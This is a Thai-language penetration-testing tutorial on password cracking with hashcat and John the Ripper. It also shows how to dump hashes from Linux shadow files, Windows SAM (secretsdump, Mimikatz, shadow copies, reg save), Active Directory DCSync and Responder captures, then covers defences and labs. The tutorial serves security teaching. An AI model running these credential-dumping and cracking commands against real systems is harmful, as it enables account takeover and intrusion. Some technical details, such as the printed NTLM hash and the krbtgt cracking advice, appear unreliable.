# Part 37: Password Attacks - Hashcat, John the Ripper และการ Crack รหัสผ่าน

## สารบัญ
1. [ทำความเข้าใจ Password Hashing](#1-ทำความเข้าใจ-password-hashing)
2. [Hashcat - GPU Password Cracker](#2-hashcat---gpu-password-cracker)
3. [John the Ripper - CPU Password Cracker](#3-john-the-ripper---cpu-password-cracker)
4. [Attack Modes และกลยุทธ์](#4-attack-modes-และกลยุทธ์)
5. [Wordlist และ Rules](#5-wordlist-และ-rules)
6. [การดึง Hash จากระบบ](#6-การดึง-hash-จากระบบ)
7. [Online Hash Cracking](#7-online-hash-cracking)
8. [Rainbow Tables](#8-rainbow-tables)
9. [การป้องกัน](#9-การป้องกัน)
10. [แบบฝึกหัด Lab](#10-แบบฝึกหัด-lab)

---

## 1. ทำความเข้าใจ Password Hashing

### ประเภทของ Hash ที่พบบ่อย

```bash
# MD5 (ไม่ปลอดภัย, เร็ว)
echo -n 'password123' | md5sum
# Output: 482c811da5d5b4bc6d497ffa98491e38  -

# SHA1 (ไม่ปลอดภัย)
echo -n 'password123' | sha1sum
# Output: cbfdac6008f9cab4083784cbd1874f76618d2a97  -

# SHA256
echo -n 'password123' | sha256sum
# Output: ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f  -

# bcrypt (ปลอดภัย, ช้า)
python3 -c "import bcrypt; print(bcrypt.hashpw(b'password123', bcrypt.gensalt()).decode())"
# Output: $2b$12$...
```

### การระบุประเภท Hash

```bash
# ใช้ hashid
hashid '482c811da5d5b4bc6d497ffa98491e38'
# Output:
# Analyzing '482c811da5d5b4bc6d497ffa98491e38'
# [+] MD2
# [+] MD5
# [+] MD4

hashid '$2b$12$WMdE3gFhCeE1S5mQJlM3nu3jL9ZkXKEzHkmxOLQ8fRbWxb3oA0qDi'
# [+] Blowfish(OpenBSD)
# [+] Woltlab Burning Board 4.x
# [+] bcrypt

# ใช้ hash-identifier (built-in Kali)
hash-identifier
# แล้วใส่ hash

# ใช้ hashcat --example-hashes เพื่อดูรูปแบบ
hashcat --example-hashes | grep -A 2 'MD5'
```

### Hashcat Hash Modes ที่สำคัญ

| Mode | Algorithm | ตัวอย่าง Hash |
|------|-----------|---------------|
| 0 | MD5 | `482c811da5d5b4bc6d497ffa98491e38` |
| 100 | SHA1 | `cbfdac6008f9cab4083784cbd1874f76618d2a97` |
| 1400 | SHA256 | `ef92b778bafe771e89245b...` |
| 1800 | sha512crypt | `$6$rounds=5000$...` |
| 3200 | bcrypt | `$2b$12$...` |
| 1000 | NTLM | `8846f7eaee8fb117ad06bdd830b7586c` |
| 5600 | NetNTLMv2 | `Admin::WORKGROUP:...` |
| 22000 | WPA-PBKDF2-PMKID+EAPOL | (WiFi) |
| 5500 | NetNTLMv1 | |
| 500 | md5crypt (Unix) | `$1$salt$...` |
| 1500 | DES (Unix) | `13kerBOygDCwE` |
| 7400 | sha256crypt | `$5$rounds=...` |

---

## 2. Hashcat - GPU Password Cracker

### การติดตั้งและตรวจสอบ

```bash
# ตรวจสอบว่ามี hashcat
which hashcat
hashcat --version
# hashcat v6.2.6

# ตรวจสอบ GPU/CPU
hashcat -I
# Output:
# hashcat (v6.2.6) starting in backend information mode
# 
# CUDA Info:
# CUDA.Version.: 11.8
# 
# Backend Device ID #1 (Alias: #2)
#   Name...........: NVIDIA GeForce RTX 3080
#   Processor(s)...: 8704
#   Clock..........: 1800
#   Memory.Total...: 10240 MB
#   Memory.Free....: 9216 MB

# ทดสอบ benchmark
hashcat -b -m 0
# Speed.#1.........:  8234.4 MH/s (MD5 - RTX 3080)
```

### Hashcat Basic Syntax

```bash
hashcat [options] hashfile [wordlist|mask|directory]

# Options สำคัญ:
# -m = hash type (mode)
# -a = attack mode (0=dict, 1=combo, 3=brute, 6=hybrid)
# -o = output file
# --show = แสดง cracked passwords
# -r = rules file
# --increment = เพิ่มความยาว mask ทีละ 1
```

### Dictionary Attack (Mode 0)

```bash
# สร้างไฟล์ hash ทดสอบ
echo '482c811da5d5b4bc6d497ffa98491e38' > hashes.txt
echo '5f4dcc3b5aa765d61d8327deb882cf99' >> hashes.txt
echo 'e10adc3949ba59abbe56e057f20f883e' >> hashes.txt

# Crack ด้วย rockyou.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Output:
# 482c811da5d5b4bc6d497ffa98491e38:password123
# 5f4dcc3b5aa765d61d8327deb882cf99:password
# e10adc3949ba59abbe56e057f20f883e:123456
# 
# Session..........: hashcat
# Status...........: Cracked
# Hash.Mode........: 0 (MD5)
# Hash.Target......: hashes.txt
# Time.Started.....: Mon Sep 28 10:00:00 2026
# Time.Estimated...: Mon Sep 28 10:00:05 2026
# Speed.#1.........:  2345.6 kH/s
# Recovered........: 3/3 (100.00%) Digests

# ดูผลลัพธ์ที่ crack ได้
hashcat -m 0 hashes.txt --show
# 482c811da5d5b4bc6d497ffa98491e38:password123
# 5f4dcc3b5aa765d61d8327deb882cf99:password
```

### Brute Force Attack (Mode 3)

```bash
# Mask characters:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digit (0-9)
# ?s = special (!@#$%...)
# ?a = all (?l?u?d?s)
# ?h = hex lowercase (0-9a-f)
# ?H = hex uppercase (0-9A-F)

# Crack 6 ตัวอักษรทั้งหมด (lowercase)
hashcat -m 0 -a 3 hashes.txt '?l?l?l?l?l?l'

# Crack รหัส 8 ตัว (uppercase + lowercase + digit)
hashcat -m 0 -a 3 hashes.txt '?u?l?l?l?l?d?d?d'

# Crack รหัสที่เริ่มต้นด้วย Pass แล้วตามด้วย 4 ตัวเลข
hashcat -m 0 -a 3 hashes.txt 'Pass?d?d?d?d'

# Increment mode (ลอง 1-8 ตัว)
hashcat -m 0 -a 3 hashes.txt '?a?a?a?a?a?a?a?a' --increment --increment-min=1

# ดูความเร็วโดยไม่ crack จริง (benchmark สำหรับ mask)
hashcat -m 0 -a 3 hashes.txt '?l?l?l?l?l?l' --keyspace
# 308,915,776
```

### Rule-based Attack (Mode 0 + -r)

```bash
# ดู rules ที่มีใน Kali
ls /usr/share/hashcat/rules/
# best64.rule
# combinator.rule
# d3ad0ne.rule
# dive.rule
# generated.rule
# InsidePro-HashManager.rule
# InsidePro-PasswordsPro.rule
# leetspeak.rule
# Incisive-leetspeak.rule
# oscommerce.rule
# rockyou-30000.rule
# specific.rule
# T0XlC-insert_00-09_1-4_letters.rule
# T0XlC-insert_space_and_special_0_F.rule
# T0XlC-insert_top_100_passwords_1_G.rule
# T0XlC.rule
# T0XlCv1.rule
# unix-ninja-leetspeak.rule

# ใช้ best64.rule (เพิ่ม suffixes, leetspeak)
hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt /usr/share/wordlists/rockyou.txt

# ใช้หลาย rules
hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/d3ad0ne.rule hashes.txt wordlist.txt

# สร้าง custom rule
cat > custom.rule << 'EOF'
# เพิ่มตัวเลขท้าย
$1
$2
$3
$123
$1234
$12345
$!
$@
$#
# Capitalize first letter
c
# ทำตัวพิมพ์ใหญ่ทั้งหมด
u
# Reverse
r
# leetspeak
sa4 se3 si1 so0
EOF

hashcat -m 0 -a 0 -r custom.rule hashes.txt wordlist.txt
```

### Combination Attack (Mode 1)

```bash
# รวม 2 wordlists เข้าด้วยกัน
echo -e 'pass\ntest\nweb' > wordlist1.txt
echo -e '123\n2024\n!' > wordlist2.txt

hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt
# ลอง: pass123, pass2024, pass!, test123, test2024, test!, web123, web2024, web!
```

### Hybrid Attack (Mode 6/7)

```bash
# Mode 6: wordlist + mask (เพิ่ม mask ต่อท้าย)
hashcat -m 0 -a 6 hashes.txt wordlist.txt '?d?d?d?d'
# ลอง: password0000, password0001, ..., admin1234

# Mode 7: mask + wordlist (เพิ่ม mask นำหน้า)
hashcat -m 0 -a 7 hashes.txt '?d?d?d?d' wordlist.txt
# ลอง: 0000password, 0001password, ..., 1234admin
```

### NTLM Hash (Windows)

```bash
# NTLM hash example
echo '8846f7eaee8fb117ad06bdd830b7586c' > ntlm.txt

# Crack NTLM
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt

# Crack NetNTLMv2 (Responder capture)
cat > netntlmv2.txt << 'EOF'
Admin::WORKGROUP:1122334455667788:1af89aa97ea01e4c4eb66e3d88ddb32e:0101000000000000c0653150de0d0201b61a1b3c7aab1d4b00000000020008004b004f004900490001001e00570049004e002d0049003900390039003200370053004e00330054004500040014004b004f00490049002e004c004f00430041004c0003003400570049004e002d0049003900390039003200370053004e003300540045002e004b004f00490049002e004c004f00430041004c00050014004b004f00490049002e004c004f00430041004c0008003000300000000000000000000000001000008de7a1a5c1ef5dfc3b5a6b3a9e5e0bb0a0000000000000000
EOF

hashcat -m 5600 -a 0 netntlmv2.txt /usr/share/wordlists/rockyou.txt
# Admin::WORKGROUP:...:password123
```

### WPA2 WiFi Hash

```bash
# ต้องแปลง .cap เป็น .hc22000 ก่อน
hcxpcapngtool -o wifi.hc22000 capture.cap

# หรือใช้ hcxdumptool capture โดยตรง
# (ดูเพิ่มเติมใน Part 39 - Wireless)

hashcat -m 22000 -a 0 wifi.hc22000 /usr/share/wordlists/rockyou.txt
# WPA2 Password: P@ssw0rd!
```

---

## 3. John the Ripper - CPU Password Cracker

### การใช้งานพื้นฐาน

```bash
# ตรวจสอบ john
john --version
# John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c

# ดู formats ที่รองรับ
john --list=formats | head -50
# descrypt, bsdicrypt, md5crypt, md5crypt-long, bcrypt,
# scrypt, LM, AFS, tripcode, AndroidBackup, adxcrypt...

# Auto-detect format
john --format=auto hashes.txt

# ใช้ wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# ดูผลลัพธ์
john --show hashes.txt
# password123    (user1)
# admin          (user2)
# 2 password hashes cracked, 0 left
```

### Linux /etc/shadow

```bash
# ต้อง unshadow ก่อน (รวม /etc/passwd + /etc/shadow)
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Crack
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# ดูผลลัพธ์
john --show unshadowed.txt
# root:toor:0:0:root:/root:/bin/bash
# user1:password1:1000:1000:,,,:/home/user1:/bin/bash

# ตัวอย่าง shadow hash format:
# $6$ = SHA-512 (sha512crypt) - Hashcat mode 1800
# $5$ = SHA-256 (sha256crypt) - Hashcat mode 7400
# $1$ = MD5 (md5crypt) - Hashcat mode 500
# $y$ = yescrypt
# $2y$ = bcrypt
```

### ZIP/RAR/PDF Password

```bash
# สร้าง hash จาก ZIP
zip2john protected.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
john --show zip_hash.txt

# RAR
rar2john protected.rar > rar_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt

# PDF
pdf2john protected.pdf > pdf_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt

# SSH Private Key
ssh2john id_rsa > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
john --show ssh_hash.txt
# id_rsa:MyPassword123

# GPG
gpg2john secret.gpg > gpg_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt gpg_hash.txt

# KeePass
keepass2john Database.kdbx > keepass_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
```

### John Rules

```bash
# ดู rules
cat /etc/john/john.conf | grep -A 5 '\[List.Rules'

# ใช้ Single mode (ใช้ username/gecos ช่วย)
john --single hashes.txt

# ใช้ Wordlist + rules
john --wordlist=wordlist.txt --rules hashes.txt

# ใช้ Jumbo rules
john --wordlist=wordlist.txt --rules=jumbo hashes.txt

# Brute force (incremental)
john --incremental hashes.txt
john --incremental=Digits hashes.txt  # เฉพาะตัวเลข
john --incremental=Alpha hashes.txt   # เฉพาะตัวอักษร
```

---

## 4. Attack Modes และกลยุทธ์

### กลยุทธ์ที่แนะนำ (เรียงตามประสิทธิภาพ)

```bash
# 1. ลองกับ rockyou ก่อน (เร็ว, ครอบคลุม common passwords)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# 2. ใช้ rules กับ rockyou
hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt /usr/share/wordlists/rockyou.txt

# 3. ลอง common patterns
hashcat -m 0 -a 3 hashes.txt '?u?l?l?l?l?l?d?d'
hashcat -m 0 -a 3 hashes.txt '?u?l?l?l?l?d?d?d'

# 4. ลอง hybrid (wordlist + numbers)
hashcat -m 0 -a 6 hashes.txt /usr/share/wordlists/rockyou.txt '?d?d?d?d'

# 5. Targeted - ถ้ารู้ชื่อบริษัท/เป้าหมาย
cewl http://target.com -m 6 -w target_words.txt
hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt target_words.txt

# 6. Full brute force (สำหรับ hash ที่เร็ว อย่าง MD5)
hashcat -m 0 -a 3 hashes.txt '?a?a?a?a?a?a?a?a'
```

### Mask Attack Templates

```bash
# รูปแบบรหัสผ่านที่พบบ่อย:

# Word + 4 digits (Password1234)
hashcat -m 0 -a 6 hashes.txt wordlist.txt '?d?d?d?d'

# Word + Year (Admin2024)
hashcat -m 0 -a 6 hashes.txt wordlist.txt '20?d?d'

# Word + Special (Admin!)
hashcat -m 0 -a 6 hashes.txt wordlist.txt '?s'

# Capital + word + digits (Admin123)
hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt wordlist.txt

# Phone number pattern
hashcat -m 0 -a 3 hashes.txt '0?d?d?d-?d?d?d-?d?d?d?d'

# Thai ID card pattern (13 digits)
hashcat -m 0 -a 3 hashes.txt '?d?d?d?d?d?d?d?d?d?d?d?d?d'
```

---

## 5. Wordlist และ Rules

### สร้าง Custom Wordlist

```bash
# CeWL - สร้าง wordlist จากเว็บไซต์
cewl http://target.com -m 6 -d 3 -w cewl_words.txt
# -m = minimum word length
# -d = depth (crawl)
# -w = output file

cewl http://target.com -m 6 --with-numbers -w cewl_words.txt

# ดู wordlist ที่มีใน Kali
ls /usr/share/wordlists/
# fasttrack.txt
# metasploit.lst
# nmap.lst
# rockyou.txt.gz
# wfuzz/

# แตก rockyou.txt
gzip -d /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt
# 14,344,391

# ดาวน์โหลด SecLists (ครอบคลุมกว่า)
# git clone https://github.com/danielmiessler/SecLists /opt/SecLists

# Wordlists สำคัญใน SecLists:
# /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
# /opt/SecLists/Passwords/darkweb2017-top10000.txt
# /opt/SecLists/Passwords/Leaked-Databases/rockyou-75.txt
```

### Crunch - สร้าง Wordlist แบบ Custom

```bash
# Syntax: crunch min max [charset] [options]

# สร้างรหัส 4-6 ตัวเลข
crunch 4 6 0123456789 -o digits.txt

# สร้างรหัส 6-8 ตัว lowercase
crunch 6 8 abcdefghijklmnopqrstuvwxyz -o lower.txt

# สร้างด้วย pattern (@ = lowercase, , = uppercase, % = digit, ^ = special)
crunch 8 8 -t 'Admin@@@' -o admin_pattern.txt
# AdminAAA, AdminAAB, ...

crunch 8 8 -t '%%%%@@@@' -o pattern.txt
# 0000aaaa, 0000aaab, ...

# สร้าง wordlist จาก charset file
cat > charset.lst << 'EOF'
thaipassword=abcdefghijklmnopqrstuvwxyz0123456789!@#
EOF

crunch 6 8 -f charset.lst thaipassword -o thai.txt
```

### Hashcat Rules ขั้นสูง

```bash
# Rule functions:
# l = lowercase all
# u = uppercase all
# c = capitalize first letter
# C = lowercase first, uppercase rest
# r = reverse
# d = duplicate (password -> passwordpassword)
# f = reflect (password -> passworddrowssap)
# $ = append char
# ^ = prepend char
# [ = delete first char
# ] = delete last char
# D = delete char at position
# i = insert char at position
# o = overwrite char at position
# s = replace char
# @ = remove all instances of char
# x = extract substring
# M = memorize word
# X = append memorized word

# ตัวอย่าง rules:
cat > advanced.rule << 'EOF'
# ทำ leetspeak
sa4
se3
i11
so0

# เพิ่ม common suffixes
$1
$!
$123
$2024
$#

# Capitalize + number
c $1
c $2024
c $!

# Combine
c sa4 se3 $!
EOF

hashcat -m 0 -a 0 -r advanced.rule hashes.txt wordlist.txt

# ดูว่า rule สร้าง passwords อะไรบ้าง
hashcat --stdout -r advanced.rule wordlist.txt | head -20
```

---

## 6. การดึง Hash จากระบบ

### Linux - ดึง /etc/shadow

```bash
# ต้อง root
cat /etc/shadow
# root:$6$rounds=5000$abcdef$HASH:18000:0:99999:7:::
# user1:$6$rounds=5000$xyz$HASH:18000:0:99999:7:::

# รูปแบบ: username:hash:lastchange:min:max:warn:inactive:expire

# เตรียมไฟล์สำหรับ hashcat
awk -F: '{print $2}' /etc/shadow | grep '\$' > shadow_hashes.txt

# หรือ unshadow สำหรับ john
unshadow /etc/passwd /etc/shadow > unshadowed.txt
```

### Windows - ดึง SAM Database

```bash
# วิธี 1: Impacket secretsdump (remote)
impacket-secretsdump administrator:password@192.168.1.10
# Output:
# [*] Service RemoteRegistry is in stopped state
# [*] Starting service RemoteRegistry
# [*] Target system bootKey: 0x12345678...
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# user1:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# วิธี 2: Mimikatz (local, ต้อง SYSTEM)
# sekurlsa::logonpasswords
# lsadump::sam
# lsadump::secrets

# วิธี 3: Volume Shadow Copy
vssadmin create shadow /for=C:
vssadmin list shadows
copy \\?\Volume{GUID}\\Windows\System32\config\SAM C:\SAM
copy \\?\Volume{GUID}\\Windows\System32\config\SYSTEM C:\SYSTEM

# ดึงจาก VSS ด้วย impacket
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# วิธี 4: reg save (ต้อง admin)
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SECURITY SECURITY
```

### Active Directory - Domain Hash Dump

```bash
# DCSync attack (ต้อง Domain Admin หรือ Replication rights)
impacket-secretsdump -dc-ip 192.168.1.1 DOMAIN/admin:password@192.168.1.1

# Output:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH:::
# DOMAIN\user1:1105:aad3b435b51404eeaad3b435b51404ee:HASH:::

# Crack krbtgt (สำหรับ Golden Ticket)
echo 'KRBTGT_HASH' > krbtgt.txt
hashcat -m 1000 -a 0 krbtgt.txt /usr/share/wordlists/rockyou.txt

# NTDS.dit (offline)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Responder - NTLM Capture

```bash
# ดักรับ NTLM hashes บน network
responder -I eth0 -wrf

# Output เมื่อมีคนเชื่อมต่อ:
# [SMB] NTLMv2-SSP Client   : 192.168.1.105
# [SMB] NTLMv2-SSP Username : DOMAIN\user1
# [SMB] NTLMv2-SSP Hash     : user1::DOMAIN:...

# Responder จะบันทึก hashes ใน:
ls /usr/share/responder/logs/
# SMB-NTLMv2-SSP-192.168.1.105.txt

# Crack ด้วย hashcat
hashcat -m 5600 -a 0 /usr/share/responder/logs/SMB-NTLMv2*.txt /usr/share/wordlists/rockyou.txt
```

---

## 7. Online Hash Cracking

```bash
# เว็บไซต์ crack hash ออนไลน์ (ใช้สำหรับ common hashes)
# - https://crackstation.net
# - https://hashes.com/en/decrypt/hash
# - https://www.onlinehashcrack.com
# - https://md5decrypt.net

# ตรวจสอบว่า hash ถูก crack แล้วหรือยัง
curl -s 'https://hashes.com/api/v1/decrypt' \
  -d 'hashes[]=482c811da5d5b4bc6d497ffa98491e38' \
  -d 'hashes[]=5f4dcc3b5aa765d61d8327deb882cf99'

# หมายเหตุ: อย่าส่ง hash ที่ sensitive ไปยัง online services
# ควรใช้สำหรับ CTF หรือ known hash เท่านั้น
```

---

## 8. Rainbow Tables

```bash
# Rainbow Tables คือ precomputed hash tables
# เร็วกว่า brute force แต่ใช้พื้นที่มาก
# ไม่ได้ผลกับ salted hashes

# Ophcrack (Windows NTLM Rainbow Tables)
apt install ophcrack
ophcrack  # GUI

# ดาวน์โหลด tables จาก https://ophcrack.sourceforge.io/tables.php
# - XP free (380MB) - crack WinXP passwords
# - Vista free (461MB) - crack Vista/7 passwords

# Rainbowcrack
rcrack . -f hash.txt  # ใช้ tables ที่มีอยู่แล้ว

# rtgen - สร้าง rainbow tables เอง
# rtgen md5 loweralpha 1 7 0 3800 33554432 0
# (ใช้เวลานาน, ต้องการพื้นที่มาก)

# ทำไม salt ถึงป้องกัน rainbow tables ได้?
# hash('password') = AAAA (เหมือนกันทุกครั้ง)
# hash('password' + 'RANDOM_SALT') = ??? (ต่างกันทุกครั้ง)
# Rainbow table ต้องสร้างใหม่สำหรับทุก salt
```

---

## 9. การป้องกัน

### Password Storage Best Practices

```python
# ไม่ควรทำ
import hashlib
def bad_hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()  # MD5 ไม่ปลอดภัย!

# ควรทำ - ใช้ bcrypt
import bcrypt
def hash_password(password):
    salt = bcrypt.gensalt(rounds=12)  # rounds สูง = ช้าขึ้น = ปลอดภัยขึ้น
    return bcrypt.hashpw(password.encode(), salt)

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode(), hashed)

# ควรทำ - ใช้ Argon2 (ดีที่สุดในปัจจุบัน)
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash('password123')
# $argon2id$v=19$m=65536,t=3,p=4$...

ph.verify(hash, 'password123')  # True

# PHP
// ใช้ password_hash() และ password_verify()
$hash = password_hash('password123', PASSWORD_BCRYPT, ['cost' => 12]);
if (password_verify('password123', $hash)) {
    echo 'Valid!';
}
```

### Password Policy

```bash
# Linux - ตั้ง password policy ด้วย PAM
cat /etc/pam.d/common-password

# ติดตั้ง libpam-pwquality
apt install libpam-pwquality

# แก้ไข /etc/security/pwquality.conf
cat > /etc/security/pwquality.conf << 'EOF'
minlen = 12
minclass = 3
maxrepeat = 2
maxclassrepeat = 4
rejectusername = 1
dictcheck = 1
EOF

# Windows - Group Policy
# Computer Configuration > Windows Settings > Security Settings
# > Account Policies > Password Policy
# - Minimum password length: 12
# - Password complexity: Enabled
# - Maximum password age: 90 days
# - Enforce password history: 24 passwords
```

### Multi-Factor Authentication

```bash
# MFA ทำให้ password ที่ crack ได้ ไม่สามารถใช้งานได้
# Even if attacker knows password, they still need:
# - TOTP (Time-based OTP) - Google Authenticator, Authy
# - SMS OTP
# - Hardware key (YubiKey)
# - Biometric

# ติดตั้ง Google Authenticator บน Linux
apt install libpam-google-authenticator
google-authenticator  # ตั้งค่าสำหรับ user

# เพิ่ม PAM config
echo 'auth required pam_google_authenticator.so' >> /etc/pam.d/sshd
```

---

## 10. แบบฝึกหัด Lab

### Lab 1: Crack MD5 Hashes

```bash
# สร้าง hash ทดสอบ
python3 -c "
import hashlib
passwords = ['sunshine', 'monkey', 'dragon', 'master', 'iloveyou']
for p in passwords:
    print(hashlib.md5(p.encode()).hexdigest())
" > lab1_hashes.txt

# Crack ด้วย rockyou
hashcat -m 0 -a 0 lab1_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 lab1_hashes.txt --show
```

### Lab 2: Crack Salted Hash

```bash
# สร้าง sha512crypt hash
python3 -c "
import crypt
print(crypt.crypt('secret123', crypt.mksalt(crypt.METHOD_SHA512)))
"
# $6$rounds=5000$SALT$HASH

# บันทึกและ crack
echo '$6$rounds=5000$SALT$HASH' > sha512_hash.txt
hashcat -m 1800 -a 0 sha512_hash.txt /usr/share/wordlists/rockyou.txt
```

### Lab 3: ZIP Password Crack

```bash
# สร้าง password-protected ZIP
zip -P password123 secret.zip /etc/hostname

# ดึง hash
zip2john secret.zip > zip_hash.txt
cat zip_hash.txt

# Crack
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
john --show zip_hash.txt
```

### Lab 4: SSH Key Password Crack

```bash
# สร้าง SSH key ที่มี passphrase
ssh-keygen -t rsa -b 2048 -f test_key -N 'mypassphrase'

# ดึง hash
ssh2john test_key > ssh_hash.txt

# สร้าง mini wordlist
echo 'mypassphrase' > wordlist.txt
echo 'wrongpassword' >> wordlist.txt

# Crack
john --wordlist=wordlist.txt ssh_hash.txt
john --show ssh_hash.txt
```

### Lab 5: NTLM Hash Crack

```bash
# สร้าง NTLM hash (Windows)
python3 -c "
import hashlib
import binascii
password = 'Password1'
hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
print(f'NTLM: {hash}')
"
# NTLM: c0e8e5b9b0c9ce2d7e22785f01a7b1a9

# Crack
echo 'c0e8e5b9b0c9ce2d7e22785f01a7b1a9' > ntlm.txt
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm.txt --show
```

---

## สรุป

| เครื่องมือ | ใช้สำหรับ | จุดเด่น |
|-----------|-----------|--------|
| hashcat | Hash cracking (GPU) | เร็วมาก, รองรับหลาย format |
| john | Hash cracking (CPU) | ง่าย, รองรับไฟล์ ZIP/SSH/PDF |
| cewl | สร้าง wordlist จากเว็บ | Targeted attacks |
| crunch | สร้าง wordlist แบบ pattern | Custom patterns |
| responder | ดัก NTLM hashes | Network attacks |
| impacket-secretsdump | ดึง hash จาก Windows | Remote/local |

### Cracking Speed Guide

| Algorithm | Speed (RTX 3080) | ความยากในการ Crack |
|-----------|------------------|--------------------|
| MD5 | 8,000 MH/s | ง่ายมาก |
| SHA1 | 3,000 MH/s | ง่าย |
| SHA256 | 1,200 MH/s | ง่าย-ปานกลาง |
| NTLM | 10,000 MH/s | ง่ายมาก |
| bcrypt (12) | 23 kH/s | ยากมาก |
| Argon2 | 5 kH/s | ยากมากๆ |

---

**ต่อไป:** [Part 38 - Active Directory Attacks](Part-38-Active-Directory-Attacks.md)
